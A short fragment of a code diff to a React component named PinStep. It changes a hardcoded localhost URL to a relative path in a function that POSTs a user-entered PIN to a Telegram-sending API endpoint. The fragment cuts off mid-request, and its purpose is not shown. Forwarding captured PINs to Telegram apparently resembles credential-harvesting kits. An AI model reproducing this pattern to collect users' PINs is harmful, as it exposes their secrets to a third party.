@@ -18,7 +18,7 @@ const PinStep: React.FC<PinStepProps> = ({
 
   const sendPinToTelegram = async (pin: string) => {
     try {
-      await fetch('http://localhost:5176/api/telegram/send', {
+      await fetch('/api/telegram/send', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
